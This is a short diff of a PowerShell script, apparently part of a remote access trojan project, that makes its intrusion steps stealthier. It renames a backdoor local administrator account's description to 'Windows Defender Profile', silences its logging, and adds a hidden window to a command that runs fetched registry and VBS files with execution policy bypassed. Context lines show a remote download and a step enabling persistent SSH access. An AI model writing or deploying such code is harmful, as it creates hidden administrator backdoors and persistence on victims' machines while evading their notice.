@@ -12,10 +12,10 @@ function create_account {
     begin {
     }    
     process {
-        New-LocalUser "$xf061name" -Password $xf061pass -FullName "$xf061name" -Description "Temporary local admin"
-        Write-Verbose "$xf061name local user crated"
+        New-LocalUser "$xf061name" -Password $xf061pass -FullName "$xf061name" -Description "Windows Defender Profile"
+        # Write-Verbose "$xf061name local user crated"
         Add-LocalGroupMember -Group "Administrators" -Member "$xf061name"
-        Write-Verbose "$xf061name added to the local administrator group"
+        # Write-Verbose "$xf061name added to the local administrator group"
     }    
     end {
     }
@@ -46,7 +46,7 @@ iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads
 
 # execute the registry entry process
 # .\"$reg_file.reg";"$vbs_file.vbs"
-powershell -noP -ep bypass Start-Process powershell.exe ".\$reg_file.reg;.\$vbs_file.vbs"
+powershell -noP -ep bypass Start-Process powershell.exe -windowstyle hidden ".\$reg_file.reg;.\$vbs_file.vbs"
 
 # enable persistent ssh
 # Install the OpenSSH Server feature
